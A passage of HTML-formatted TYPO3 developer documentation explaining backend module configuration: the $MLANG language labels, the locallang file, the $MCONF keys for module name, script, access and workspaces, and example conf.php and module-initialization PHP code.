$MLANG[&quot;default&quot;][&quot;tabs&quot;][&quot;tab&quot;] = &quot;Func&quot;;
$MLANG[&quot;default&quot;][&quot;tabs_images&quot;][&quot;tab&quot;] = &quot;func.gif&quot;;

$MLANG[&quot;dk&quot;][&quot;labels&quot;][&quot;tablabel&quot;] = &quot;Avancerede funktioner&quot;;
$MLANG[&quot;dk&quot;][&quot;tabs&quot;][&quot;tab&quot;] = &quot;Funk.&quot;;

$MLANG[&quot;de&quot;][&quot;labels&quot;][&quot;tablabel&quot;] = &quot;Erweiterte Funktionen&quot;;
$MLANG[&quot;de&quot;][&quot;tabs&quot;][&quot;tab&quot;] = &quot;Funk.&quot;;

$MLANG[&quot;no&quot;][&quot;labels&quot;][&quot;tablabel&quot;] = &quot;Avanserte funksjoner&quot;;
$MLANG[&quot;no&quot;][&quot;tabs&quot;][&quot;tab&quot;] = &quot;Funk.&quot;;

$MLANG[&quot;it&quot;][&quot;labels&quot;][&quot;tablabel&quot;] = &quot;Funzioni avanzate&quot;;
$MLANG[&quot;it&quot;][&quot;tabs&quot;][&quot;tab&quot;] = &quot;Funzione&quot;;
...

(OBSOLETE!)
</PRE><P CLASS="western">
This is still supported for backwards compatibility reasons. Today
you need to configure only two lines, one for a &quot;locallang&quot;
file reference and one for the icon image:</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'default'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tabs_images'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tab'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'func.gif'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'default'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'ll_ref'</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">'LLL:EXT:lang/locallang_mod_web_func.php'</FONT><FONT COLOR="#007700">;</FONT></FONT></PRE><P CLASS="western">
The icon reference (line 1) points to an icon image relative to the
current directory (normally located there).</P>
<P CLASS="western">The &quot;locallang&quot; file reference in line 2
points to a &quot;locallang&quot;-file which in this case looks like
this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#0000bb">&lt;?php</FONT>
<FONT COLOR="#ff8000"># TYPO3 CVS ID: $Id: locallang_mod_web_func.php,v 1.5 2004/04/30 16:19:54 typo3 Exp $</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$LOCAL_LANG </FONT><FONT COLOR="#007700">= Array (</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'default' </FONT><FONT COLOR="#007700">=&gt; Array (</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'title' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Advanced functions'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'clickAPage_content' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Please click a page title in the page tree.'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mlang_labels_tablabel' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Advanced functions'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mlang_labels_tabdescr' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'You\'ll find general export and import functions here. ... sorting of pages.'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mlang_tabs_tab' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Functions'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;),</FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'dk' </FONT><FONT COLOR="#007700">=&gt; Array (</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'title' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Avancerede funktioner'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'clickAPage_content' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Klik på en sidetitel i sidetræet.'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mlang_labels_tablabel' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Avancerede funktioner'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mlang_labels_tabdescr' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Her vil du finde generelle eksport og import funktioner. ... sortering af sider.'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#dd0000">'mlang_tabs_tab' </FONT><FONT COLOR="#007700">=&gt; </FONT><FONT COLOR="#dd0000">'Funktioner'</FONT><FONT COLOR="#007700">,</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;),</FONT>
<FONT COLOR="#007700">...</FONT>
<FONT COLOR="#007700">);</FONT>
<FONT COLOR="#0000bb">?&gt;</FONT></PRE><P CLASS="western">
In this locallang file, some keys are reserved words that point out
information related to the &quot;conf.php&quot; file:</P>
<UL>
	<LI><P CLASS="western"><B>mlang_tabs_tab</B> : Title of the module
	in the menu.</P>
	<LI><P CLASS="western"><B>mlang_labels_tablabel</B> : Long title of
	the module. Used as &quot;title&quot; attribute for menu link and
	title in the &quot;About modules&quot; list.</P>
	<LI><P CLASS="western"><B>mlang_labels_tabdescr</B> : Description of
	the module (used in &quot;About modules&quot;)</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">$MCONF</H4>
<P CLASS="western"><BR><BR>
</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=79*>
	<COL WIDTH=177*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=31%>
				<P CLASS="western">$MCONF keys</P>
			</TH>
			<TH WIDTH=69%>
				<P CLASS="western">Description</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">]</FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">Module name.</P>
				<UL>
					<LI><P CLASS="western">For main modules this is [<I>module-key</I>]</P>
					<LI><P CLASS="western">For sub modules this is
					[<I>module-key</I>]_[<I>sub-module-key</I>]</P>
					<LI><P CLASS="western">For Stand-Alone scripts, prefixed &quot;xMOD_&quot;
					and then probably the file-name or another unique
					identification.</P>
				</UL>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Examples (Backend Modules):</B></P>
				<P CLASS="western"><BR>
				</P>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Main module (from extension)</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;name&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;txtempM1&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>

<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Submodule of &quot;Web&quot; main module:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;name&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;web_txtempM2&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT>

<FONT COLOR="#000000"><FONT COLOR="#007700">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// File&gt;Filelist module:</FONT></FONT>
<FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">'file_list'</FONT><FONT COLOR="#007700">;</FONT></PRE><P CLASS="western">
				<B>Example (Stand-alone scripts):</B></P>
				<P CLASS="western"><BR>
				</P>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Setting pseudo module name</FONT></FONT>
<FONT COLOR="#0000bb">$this</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">'xMOD_alt_clickmenu.php'</FONT><FONT COLOR="#007700">;</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Setting pseudo module name for CSM item<BR></FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">&quot;name&quot;</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">&quot;xMOD_tx_temp_cm1&quot;</FONT><FONT COLOR="#007700">;</FONT></FONT></PRE>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'script'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">Defines the PHP script which the module is run
				by. The backend will link to this script when the module is
				activated.</P>
				<P CLASS="western">Special keyword is “_DISPATCH” which will
				indicate that the “typo3/mod.php” script is used to access
				the module.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'access'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">Defines access criteria by list of keywords.
				If &quot;admin&quot;, only admin-users have access. If &quot;user&quot;,
				&quot;group&quot; or &quot;user,group&quot; then the module is by
				default inaccessible.</P>
				<P CLASS="western"><BR>
				</P>
				<UL>
					<LI><P CLASS="western">&quot;admin&quot; : For &quot;admin&quot;
					users only.</P>
					<LI><P CLASS="western">&quot;user&quot; : Configurable for
					backend users.</P>
					<LI><P CLASS="western">&quot;group&quot; : Configurable for
					backend groups.</P>
					<LI><P CLASS="western"><SPAN STYLE="font-style: normal">[blank]</SPAN>
					: Everyone has access.</P>
				</UL>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Example:</B></P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">&quot;user,group&quot; - No one (except
				&quot;admin&quot;) has access <I>except</I> the module is
				specifically added in their user / group profile.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western">This is how the Module selector looks for both
				backend users and groups:</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><IMG SRC="10_html_m66937610.png" NAME="Graphic118" ALIGN=LEFT WIDTH=311 HEIGHT=91 BORDER=0><BR CLEAR=LEFT><BR>
				</P>
				<P CLASS="western">(For Backend Usergroups you have to enable
				&quot;Include Access Lists&quot; in order to access the module
				selector).</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'workspaces'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">Defines which workspaces the module is allowed
				to work under. Empty string means all workspaces. Otherwise this
				list of keywords can be combined to set access:</P>
				<P CLASS="western"><BR>
				</P>
				<UL>
					<LI><P CLASS="western">“online” : Available in Live (online)
					mode</P>
					<LI><P CLASS="western">“offline” : Available in Draft
					(offline) mode</P>
					<LI><P CLASS="western">“custom” : Available for custom modes</P>
				</UL>
				<P CLASS="western"><BR>
				</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'defaultMod'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">Sub-module key of sub-module to be default for
				main module. (Only for Main modules)</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'navFrameScript'</FONT><FONT COLOR="#007700">]</FONT></FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">If set, the module will become a &quot;Frameset&quot;
				module and this will point to the script running in the
				navigation frame. (Only for Main modules)</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>Example (From &quot;Web&quot; main module):</B></P>
				<P CLASS="western"><BR>
				</P>
				<PRE CLASS="western"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'navFrameScript'</FONT><FONT COLOR="#007700">]=</FONT><FONT COLOR="#dd0000">'../../alt_db_navframe.php'</FONT><FONT COLOR="#007700">;</FONT></PRE>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'navFrameScriptParam'</FONT><FONT COLOR="#007700">]</FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">GET parameters to pass to the navigation frame
				script (only Sub-modules of a frameset module).</P>
				<P CLASS="western">Parameters set for the main module will be
				inherited to submodules if not overridden.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=31%>
				<PRE CLASS="western"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'shy'</FONT><FONT COLOR="#007700">]</FONT></PRE>
			</TD>
			<TD WIDTH=69%>
				<P CLASS="western">If TRUE then the module will not be visible in
				the backend menu or anywhere modules are displayed based on the
				processing of t3lib_loadModules::load()</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<H5 CLASS="western">Example: conf.php for Stand-Alone backend scripts</H5>
<P CLASS="western">The difference between a stand-alone backend
script and a backend module is that the backend module has an API for
access control and a menu item. But they share the same requirements
for basic initialization.</P>
<P CLASS="western">The most basic configuration for a backend script
is setting the TYPO3_MOD_PATH constant and the $BACK_PATH variable
before including &quot;init.php&quot;. The script
&quot;typo3/install/index.php&quot; is an example of this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'install/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">=</FONT><FONT COLOR="#dd0000">'../'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700">...</FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">require(</FONT><FONT COLOR="#dd0000">'../init.php'</FONT><FONT COLOR="#007700">);</FONT></FONT></PRE><P CLASS="western">
It is more common to define the TYPO3_MOD_PATH constant and
$BACK_PATH variable in a separate conf-file - that is always done for
modules and when you are supplying backend scripts from extensions.
In such a case the initialization of the backend script will look
like this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000"><FONT COLOR="#007700">unset(</FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">require(</FONT><FONT COLOR="#dd0000">'conf.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#007700">require(</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700">...</FONT></PRE><P CLASS="western">
The file &quot;conf.php&quot; looks like this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#0000bb">&lt;?php</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// DO NOT REMOVE OR CHANGE THESE 3 LINES:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'../typo3conf/ext/temp/cm1/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$BACK_PATH </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#dd0000">'../../../../typo3/'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'xMOD_tx_temp_cm1'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#0000bb">?&gt;</FONT></PRE><P CLASS="western">
The line defining $MCONF['name'] is optional since the script is a
stand-alone script. It might be used as a key for Function menus or
otherwise. You can tell that it is a pseudo module name since it is
prefixed &quot;xMOD_&quot;.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">The main point of TYPO3_MOD_PATH and $BACK_PATH is
to set the environment so TYPO3 knows the position of the backend
script in relation to the main backend folder, PATH_typo3. And the
inclusion of &quot;init.php&quot; is required in order to initialize
the backend environment and authenticate the backend user. If the
script returns from &quot;init.php&quot; it went well and you can be
safe that a backend user is logged in (unless configured otherwise).</P>
<H5 CLASS="western">Example: conf.php for Backend Modules</H5>
<P CLASS="western">The conf.php file for a backend module compared to
a stand-alone script is different mainly by defining values for
$MCONF and $MLANG. This is an example:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#0000bb">&lt;?php</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// DO NOT REMOVE OR CHANGE THESE 3 LINES:</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'../typo3conf/ext/temp/mod2/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$BACK_PATH </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#dd0000">'../../../../typo3/'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'web_txtempM2'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'access'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'user,group'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'script'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'index.php'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'default'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tabs_images'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'tab'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'moduleicon.gif'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000"><FONT COLOR="#0000bb">$MLANG</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'default'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'ll_ref'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'LLL:EXT:temp/mod2/locallang_mod.php'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#0000bb">?&gt;</FONT></PRE><P CLASS="western">
It doesn't do any difference whether the module is a main- or
sub-module. Only the $MCONF['name'] will change in that case.</P>
<H3 CLASS="western"><A NAME="2.5.3.The Module script|outline"></A>The
Module script</H3>
<H4 CLASS="western">Main framework of a Backend Module or Stand-Alone
script</H4>
<P CLASS="western">After the initialization a Backend Module or
Stand-Alone script can contain any custom PHP code you wish. However
most scripts from the core and system extensions will follow the same
model as all other backend modules. An example looks like this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#ff8000"><FONT COLOR="#000000">  29:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;// DEFAULT initialization of a module [BEGIN]</FONT>
<FONT COLOR="#000000">  30:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#007700">unset(</FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  31:<FONT COLOR="#007700"> require(</FONT><FONT COLOR="#dd0000">'conf.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  32:<FONT COLOR="#007700"> require(</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  33:<FONT COLOR="#007700"> require(</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'template.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  34:<FONT COLOR="#007700"> </FONT><FONT COLOR="#0000bb">$LANG</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">includeLLFile</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'EXT:temp/cm1/locallang.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  36:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#007700">require_once (</FONT><FONT COLOR="#0000bb">PATH_t3lib</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'class.t3lib_scbase.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">  37:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// ....(But no access check here...)</FONT></FONT>
<FONT COLOR="#ff8000"><FONT COLOR="#000000">  38:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;// DEFAULT initialization of a module [END]</FONT>
<FONT COLOR="#007700">...</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  40:</FONT> class <FONT COLOR="#0000bb">tx_temp_cm1 </FONT>extends <FONT COLOR="#0000bb">t3lib_SCbase </FONT>{<BR>...<BR><FONT COLOR="#000000"> 132:</FONT> }<BR><FONT COLOR="#000000"> 133:</FONT> <BR><FONT COLOR="#000000"> 134:</FONT> <BR><FONT COLOR="#000000"> 135:</FONT> </FONT>
<FONT COLOR="#000000"> 136:<FONT COLOR="#007700"> if (</FONT><FONT COLOR="#0000bb">defined</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MODE'</FONT><FONT COLOR="#007700">) &amp;&amp; </FONT><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'XCLASS'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'ext/temp/cm1/index.php'</FONT><FONT COLOR="#007700">])&nbsp;&nbsp;&nbsp;&nbsp;{</FONT></FONT>
<FONT COLOR="#000000"> 137:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;include_once(</FONT><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#0000bb">TYPO3_MODE</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'XCLASS'</FONT><FONT COLOR="#007700">][</FONT><FONT COLOR="#dd0000">'ext/temp/cm1/index.php'</FONT><FONT COLOR="#007700">]);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 138:</FONT> }</FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 139:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 140:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 141:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 142:</FONT> </FONT>
<FONT COLOR="#000000"> 143:<FONT COLOR="#007700"> </FONT><FONT COLOR="#ff8000">// Make instance:</FONT></FONT>
<FONT COLOR="#000000"> 144:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#0000bb">$SOBE </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#0000bb">t3lib_div</FONT><FONT COLOR="#007700">::</FONT><FONT COLOR="#0000bb">makeInstance</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'tx_temp_cm1'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000"> 145:<FONT COLOR="#007700"> </FONT><FONT COLOR="#0000bb">$SOBE</FONT><FONT COLOR="#007700">-&gt;</FONT><FONT COLOR="#0000bb">init</FONT><FONT COLOR="#007700">();</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 146:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000"> 147:</FONT> </FONT>
